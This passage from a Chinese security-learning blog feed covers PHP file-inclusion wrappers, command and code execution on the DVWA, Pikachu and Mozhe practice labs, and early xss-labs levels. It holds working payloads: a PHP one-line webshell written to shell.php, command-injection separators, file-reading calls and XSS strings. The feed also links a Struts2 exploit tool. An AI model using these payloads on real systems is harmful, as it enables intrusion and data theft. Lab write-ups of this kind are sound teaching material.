alt="image.png"></li><li>成功运行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019210900.png" alt="image.png"></li></ul><h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>访问本地文件系统</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>访问http(s)网址</td></tr><tr><td>ftp:&#x2F;&#x2F;</td><td>访问FTP(s)URLs</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>访问各个输入&#x2F;输出流(I&#x2F;O streams)</td></tr><tr><td>zlib:&#x2F;&#x2F;</td><td>压缩流</td></tr><tr><td>data:&#x2F;&#x2F;</td><td>数据(RFC 2397)</td></tr><tr><td>glob:&#x2F;&#x2F;</td><td>查找匹配的文件路径模式</td></tr></tbody></table><ul><li>PHP内置了很多URL风格的封装协议，可用于类似<code>fopen()</code>、<code>copy()</code>、<code>file_exists()</code>和<code>filesize()</code>的文件系统函数</li></ul><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a><code>file://协议</code></h2><ul><li><code>file://C:/Windows/system.ini</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019212143.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019212151.png" alt="image.png"></li></ul><h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php:&#x2F;&#x2F;协议"></a>php:&#x2F;&#x2F;协议</h2><ul><li>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>  <blockquote><p>php:&#x2F;&#x2F;filter用于读取源码。<br>php:&#x2F;&#x2F;input用于执行php代码。</p></blockquote></li><li><strong>php:&#x2F;&#x2F;filter</strong>：读取源代码是需要进行base64编码，不然会被直接执行</li><li>条件：<code>allow_url_fopen</code> ：off&#x2F;on、<code>allow_url_include</code>：off&#x2F;on</li><li><code>php://filter/convert.base64-encode/resource=文件路径</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019212916.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019213040.png" alt="image.png"></li><li>再解码就可以看到源码了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019213112.png" alt="image.png"></li><li><strong>php:&#x2F;&#x2F;input</strong>：可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</li><li>条件：<code>allow_url_fopen</code> ：off&#x2F;on、<code>allow_url_include</code>：on</li><li><code>filename</code>处填<code>php://input</code></li><li>直接在请求包最后加入php代码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019214013.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019214341.png" alt="image.png"></li></ul><h2 id="ZIP-协议"><a href="#ZIP-协议" class="headerlink" title="ZIP:&#x2F;&#x2F;协议"></a>ZIP:&#x2F;&#x2F;协议</h2><ul><li>可以访问压缩包里面的文件。当它与包含函数结合时，<code>zip://</code>流会被当作php文件执行。从而实现任意代码执行。<blockquote><p>zip:&#x2F;&#x2F;中只能传入绝对路径。<br>要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）<br>只需要是zip的压缩包即可，后缀名可以任意更改。<br>相同的类型还有<code>zlib://</code>和<code>bzip2://</code></p></blockquote></li><li><strong>条件：</strong></li><li><code>allow_url_fopen</code> ：off&#x2F;on</li><li><code>allow_url_include</code>：off&#x2F;on</li><li><code>zip://[压缩包绝对路径]#[压缩包内文件]</code></li></ul><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a><code>data://协议</code></h2><ul><li>同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</li><li><strong>条件：</strong></li><li><code>allow_url_fopen</code> ：on</li><li><code>allow_url_include</code>：on<blockquote><p><code>data://text/plain,&lt;?php phpinfo();?&gt;</code><br>&#x2F;&#x2F;如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：<br><code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></p></blockquote></li></ul><h2 id="伪协议利用条件"><a href="#伪协议利用条件" class="headerlink" title="伪协议利用条件"></a>伪协议利用条件</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019215814.png" alt="image.png"></p><h1 id="文件包含漏洞防护"><a href="#文件包含漏洞防护" class="headerlink" title="文件包含漏洞防护"></a>文件包含漏洞防护</h1><ol><li>使用str_replace等方法过滤掉危险字符</li><li>配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</li><li>php版本升级，防止%00截断</li><li>对上传的文件进行重命名，防止被读取</li><li>对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</li><li>做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE漏洞利用练习</title>
      <link href="/2023/10/16/RCE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0/"/>
      <url>/2023/10/16/RCE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h2 id="墨者靶场案例"><a href="#墨者靶场案例" class="headerlink" title="墨者靶场案例"></a>墨者靶场案例</h2><ul><li>案例命令注入执行分析<a href="https://www.mozhe.cn/bug/detail/12">https://www.mozhe.cn/bug/detail/12</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016164942.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016165223.png" alt="image.png"></li><li>进入网站，先查看网站的系统，因为不同系统的命令不相同</li><li>查看到是Ubuntu，即Linux<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016165405.png" alt="image.png"></li><li>输入<code>127.0.0.1| pwd</code>不行，可能是过滤了，每个都去试试<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016165504.png" alt="image.png"></li><li>抓包进行分析，发现可以输入了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016165906.png" alt="image.png"></li><li>输入<code>127.0.0.1|ls</code>成功发现key文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016170003.png" alt="image.png"></li><li>用<code>cat</code>发现并不能查看</li><li>其他查看文件的命令：less、head、tail、more</li><li>都试试，发现都不行，都是一片空白</li><li>然后在网上找到方法，使用<strong>输入重定向</strong>（最后面有补充）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &lt; key_268422068410077.php</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016170721.png" alt="image.png"></li><li>这样key就获取到了</li></ul><h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><h2 id="Pikachu靶场案例"><a href="#Pikachu靶场案例" class="headerlink" title="Pikachu靶场案例"></a>Pikachu靶场案例</h2><ul><li>exec “evel”</li><li>这个函数就是将输入框的语句当成php执行</li><li>输入phpinfo();<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016212052.png" alt="image.png"></li><li>通过burpsuite抓包，进行后续修改</li><li>更多的常用方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?txt=@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);   一句话木马</span><br><span class="line">?txt=<span class="keyword">print</span>(<span class="keyword">__LINE__</span>);           显示文件中的当前行号</span><br><span class="line">?txt=<span class="keyword">print</span>(<span class="keyword">__FILE__</span>);           获取当前绝对路径</span><br><span class="line">?txt=<span class="keyword">print</span>(<span class="keyword">__DIR__</span>);            显示文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录</span><br><span class="line">?txt=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;c:\\windows\system32\drivers\etc\hosts&#x27;</span>));  读取文件</span><br><span class="line">?txt=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="number">1</span>],<span class="variable">$POST</span>[<span class="number">2</span>]));</span><br><span class="line"><span class="number">1</span>=shell.php&amp;<span class="number">2</span>=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span>   写shell</span><br></pre></td></tr></table></figure></li><li>获取当前的绝对路径<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016212927.png" alt="image.png"></li><li>读取其他文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016213039.png" alt="image.png"></li><li><strong>一句话木马</strong></li><li>利用语句创建一个php文件，并在里面写入一句话木马<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[fin]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016215134.png" alt="image.png"></li><li>通过中国蚁剑就能查看文件了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016215217.png" alt="image.png"></li></ul><h2 id="墨者靶场案例-1"><a href="#墨者靶场案例-1" class="headerlink" title="墨者靶场案例"></a>墨者靶场案例</h2><ul><li>Apache Struts2远程代码执行漏洞(S2-015)复现<a href="https://www.mozhe.cn/bug/detail/253">https://www.mozhe.cn/bug/detail/253</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016220309.png" alt="image.png"></li><li>这里我们用工具可以很快解决</li><li>百度网盘：<a href="https://pan.baidu.com/s/13yIAHLDY1sZliQI6Wg1ZXA?pwd=t95s">struts2漏洞检测工具</a>提取码：t95s</li><li>将url输入进去，点击验证漏洞<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016220448.png" alt="image.png"></li><li>在下面框中会显示存在的漏洞<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016220528.png" alt="image.png"></li><li>选择存在的漏洞编号，我选择了S2-046<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016220610.png" alt="image.png"></li><li>在命令行当中就能进行输入了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016220645.png" alt="image.png"></li><li>key就获取到了</li></ul><h1 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h1><h2 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h2><ul><li>参考博客<a href="https://blog.csdn.net/wangzhicheng987/article/details/120971092">https://blog.csdn.net/wangzhicheng987/article/details/120971092</a></li><li>这里就看看输入重定向吧<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231016221645.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE命令执行漏洞和代码执行漏洞</title>
      <link href="/2023/10/15/RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/10/15/RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015203933.png" alt="image.png"></p><h1 id="RCE漏洞"><a href="#RCE漏洞" class="headerlink" title="RCE漏洞"></a>RCE漏洞</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015204951.png" alt="image.png"></p><ul><li>直接用的pikachu对RCE的介绍</li></ul><h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ul><li>命令执行（Remote Command Execution, RCE）</li><li>Web应用的脚本代码在执行命令的时候过滤不严，从而注入一段攻击者能够控制的代码,在服务器上以Web服务的后台权限远程执行恶意指令</li></ul><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><ul><li>代码层过滤不严</li><li>系统的漏洞造成命令注入</li><li>调用的第三方组件存在代码执行漏洞常见的命令执行函数</li></ul><ol><li>PHP：exec、shell_exec、system、passthru、popen、proc_open等</li><li>ASP.NET：System.Diagnostics.Start.Process、System.Diagnostics.Start.ProcessStartInfo等</li><li>Java：java.lang.runtime.Runtime.getRuntime、java.lang.runtime.Runtime.exec等</li></ol><h2 id="常用命令执行函数"><a href="#常用命令执行函数" class="headerlink" title="常用命令执行函数"></a>常用命令执行函数</h2><h3 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h3><ul><li>该函数会将执行的结果输出并将输出结果的最后一行作为字符串返回，如果执行失败则返回false</li><li>是最常使用到的<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;pwd&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h3><ul><li>该函数不会输出结果，但是会返回执行结果的最后一行，可以结合output进行结果的输出。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;pwd&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="passthru函数"><a href="#passthru函数" class="headerlink" title="passthru函数"></a>passthru函数</h3><ul><li>该函数只调用命令，并将运行的结果原封不动的输出，没有相应的返回值。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="shell-exec函数"><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h3><ul><li>该函数不会输出结果，返回执行结果</li><li>使用反引号<code>(``)</code>时调用的就是此函数。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ls&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h2><h3 id="Windows基础命令"><a href="#Windows基础命令" class="headerlink" title="Windows基础命令"></a>Windows基础命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ping        #测试连通性</span><br><span class="line">tracert      #追踪路由</span><br><span class="line">telnet       #远程连接</span><br><span class="line">dir          #列出目录</span><br><span class="line">ipconfig      #查看ip</span><br><span class="line">arp -a       #查看路由表</span><br><span class="line">calc         #打开计算器</span><br><span class="line">regedit      #打开注册表</span><br><span class="line">netstat -ano  #查看服务器端口信息</span><br></pre></td></tr></table></figure><h3 id="Linux基础命令"><a href="#Linux基础命令" class="headerlink" title="Linux基础命令"></a>Linux基础命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd                  #切换目录</span><br><span class="line">ls                   #显示当前目录下的文件</span><br><span class="line">ifconfig              #查看IP地址</span><br><span class="line">cat /etc/passwd       #查看password文件内容</span><br><span class="line">id                  #查看当前用户的id号</span><br><span class="line">cat /etc/group        #查看用户组文件内容</span><br><span class="line">pwd                #显示当前目录</span><br><span class="line">uname -a            #查看当前系统版本</span><br><span class="line">natstat -pantu        #查看当前服务器的端口信息</span><br><span class="line">netstat -nr           #查看网关和路由</span><br></pre></td></tr></table></figure><h3 id="拼接符"><a href="#拼接符" class="headerlink" title="拼接符"></a>拼接符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|  #只执行|后面的语句  </span><br><span class="line">|| #如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句  </span><br><span class="line">&amp;  #&amp;前面和后面命令都要执行，无论前面真假  </span><br><span class="line">&amp;&amp; #如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令  </span><br><span class="line">;  #前后都执行，无论前面真假，类似&amp;</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h3><h4 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h4><ul><li>直接输入127.0.0.1可以得到ping的结果<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015215744.png" alt="image.png"></li><li>如果直接输入dir，是不会有结果的<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015220112.png" alt="image.png"></li><li>在指令前加<code>|</code>,可以只执行后面的指令，这样就可以无视前面的ping了</li><li>输入<code>| dir</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015220313.png" alt="image.png"></li><li>输入127.0.0.1 &amp;&amp; dir就可以都执行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015220521.png" alt="image.png"></li></ul><h4 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h4><ul><li>可以看见<code>&amp;&amp;</code>和<code>；</code>都被过滤了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015220758.png" alt="image.png"></li><li>那就换成<code>|</code>或者<code>&amp;</code></li></ul><h4 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h4><ul><li>这个级别只能用<code>|</code></li><li>但是它过滤了<code>| </code>而没有过滤<code>|</code></li></ul><h1 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h1><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><ul><li>代码执行漏洞是由于服务器<strong>对危险函数过滤不严</strong>导致用户输入的一些字符串可以被转换成代码来执行,从而造成代码执行漏洞</li></ul><h2 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h2><ul><li>用户能够控制函数输入</li><li>存在可执行代码的危险函数常见代码执行函数</li></ul><ol><li>PHP: eval、assert、preg_replace()、+&#x2F;e模式（PHP版本&lt;5.5.0）</li><li>Javascript: eval</li><li>Vbscript：Execute、Eval</li><li>Python: exec</li></ol><h2 id="常用代码执行函数"><a href="#常用代码执行函数" class="headerlink" title="常用代码执行函数"></a>常用代码执行函数</h2><h3 id="执行代码"><a href="#执行代码" class="headerlink" title="${}执行代码"></a>${}执行代码</h3><ul><li>该执行代码会将中间的php代码进行解析<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$&#123;&lt;!-- --&gt;<span class="title function_ invoke__">phpinfo</span>()&#125;;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h3><ul><li>该函数会将字符串当作函数进行执行，但是需要传入一个完整的语句，同时必须以<code>；</code>分号结尾，也是<strong>最常见</strong>的函数。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &quot;hello&quot;;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h3><ul><li>该函数是判断是否为字符串，如果是则当成代码进行执行，但是在php7.0.29之后的版本不支持动态调用。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//低版本</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//7.0.29之后</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="title function_ invoke__">phpinfo</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="array-map函数"><a href="#array-map函数" class="headerlink" title="array_map函数"></a>array_map函数</h3><ul><li>该函数是为数组的每个元素应用回调函数。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>] = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$a</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//构建的payload</span></span><br><span class="line">?a=assert&amp;b=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure></li></ul><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><h3 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h3><ul><li>正常输入符号，无论输入哪个符号都是显示这样的文字<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015222246.png" alt="image.png"></li><li>尝试输入<code>phpinfo();</code>，代码被正常执行了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015222500.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs练习level1~13</title>
      <link href="/2023/10/15/xss-labs%E7%BB%83%E4%B9%A0level1~13/"/>
      <url>/2023/10/15/xss-labs%E7%BB%83%E4%B9%A0level1~13/</url>
      
        <content type="html"><![CDATA[<h1 id="xss-labs环境搭建"><a href="#xss-labs环境搭建" class="headerlink" title="xss-labs环境搭建"></a>xss-labs环境搭建</h1><ul><li>在GitHub当中下载靶场环境压缩包<a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></li></ul><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015151207.png" alt="image.png"></p><ul><li>第一关当中，看见下面有文字提示，显示<strong>payload的长度:4</strong></li><li>然后在url当中的test也是长度4，猜测是这里，我们随便改改这个<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015151339.png" alt="image.png"></li><li>发现随便输入<strong>123456</strong>，payload长度就变成6了，所以这里就是payload的位置</li><li>在这里写入语句<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;123&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015151507.png" alt="image.png"></li><li>成功了，点确定就进入level2</li></ul><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015151927.png" alt="image.png"></p><ul><li>这里猜测和level1一样，但是改在输入框当中了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015152057.png" alt="image.png"></li><li>发现语句在引号当中，这样就不能被执行了</li><li>需要让它执行，就在前面加<code>&quot;&gt;</code>，目的是让value参数结束<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;123&#x27;)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015152332.png" alt="image.png"></li></ul><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015152447.png" alt="image.png"></p><ul><li>看起来和level2差不多</li><li>输入一样的内容发现不行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015152535.png" alt="image.png"></li><li>查看html代码，发现这次value的值是用单引号的</li><li>把前面改成单引号试试<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231015152828.png" alt="image.png"></li><li>发现还是不行，输入的<code>&lt;</code>、<code>&gt;</code>都被编码成了html字符，这里是使用了<code>htmlspecialchars()</code>函数</li><li>所以我们可以尝试其他不用这些符号的语句<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=<span class="string">&#x27; onfocus=javscript:alert(&#x27;</span><span class="number">123</span><span 